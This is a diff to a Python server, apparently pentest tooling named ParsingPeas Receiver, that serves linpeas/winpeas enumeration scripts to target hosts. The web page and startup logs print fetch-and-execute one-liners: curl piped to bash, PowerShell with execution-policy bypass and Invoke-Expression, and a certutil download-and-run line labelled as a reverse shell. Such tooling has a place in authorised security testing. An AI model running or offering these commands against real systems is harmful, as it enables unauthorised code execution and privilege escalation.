@@ -111,19 +111,19 @@ def index():
 curl -sSL http://{request.host}/get-script | bash
         </code>
         
-        <p><strong>🪟 Windows CMD (PowerShell 3.0+):</strong></p>
-        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod http://{request.host}/get-script.ps1 | Invoke-Expression"
-        </code>
-        
-        <p><strong>🪟 Windows CMD (Legacy PowerShell 2.0+):</strong></p>
+        <p><strong>🪟 Windows CMD/PowerShell (Interactive):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
 powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadString('http://{request.host}/get-script.ps1') | Invoke-Expression"
         </code>
         
-        <p><strong>🪟 Windows PowerShell (if irm works):</strong></p>
+        <p><strong>🪟 Windows Netcat/Reverse Shell (Dumb Terminal):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-irm http://{request.host}/get-script.ps1 | iex
+certutil -urlcache -f http://{request.host}/get-script.ps1 %TEMP%\w.ps1 & powershell -ExecutionPolicy Bypass -File %TEMP%\w.ps1
+        </code>
+        
+        <p><strong>🪟 Windows Legacy (PowerShell 2.0):</strong></p>
+        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
+powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadString('http://{request.host}/get-script.ps1') | Invoke-Expression"
         </code>
         
         <hr>
@@ -302,7 +302,7 @@ def health():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════╗
-    ║       ParsingPeas Receiver v1.1       ║
+    ║       ParsingPeas Receiver v1.2       ║
     ║   Automated linpeas/winpeas Parser    ║
     ║    🐧 Linux  |  🪟 Windows Support    ║
     ╚═══════════════════════════════════════╝
@@ -316,9 +316,9 @@ if __name__ == '__main__':
     download_peass_scripts()
     
     log(f"[+] Starting server...\n")
-    log(f"[+] Linux:         curl -sSL http://YOUR_IP:8000/get-script | bash")
-    log(f"[+] Windows (new): powershell -ExecutionPolicy Bypass -Command \"Invoke-RestMethod http://YOUR_IP:8000/get-script.ps1 | Invoke-Expression\"")
-    log(f"[+] Windows (old): powershell -ExecutionPolicy Bypass -Command \"(New-Object System.Net.WebClient).DownloadString('http://YOUR_IP:8000/get-script.ps1') | Invoke-Expression\"\n")
+    log(f"[+] Linux:          curl -sSL http://YOUR_IP:8000/get-script | bash")
+    log(f"[+] Windows (PS):   powershell -ExecutionPolicy Bypass -Command \"(New-Object System.Net.WebClient).DownloadString('http://YOUR_IP:8000/get-script.ps1') | iex\"")
+    log(f"[+] Windows (NC):   certutil -urlcache -f http://YOUR_IP:8000/get-script.ps1 %TEMP%\\w.ps1 & powershell -ExecutionPolicy Bypass -File %TEMP%\\w.ps1\n")
     log(f"[*] Waiting for connections...\n")
     
     # Run on all interfaces, port 8000
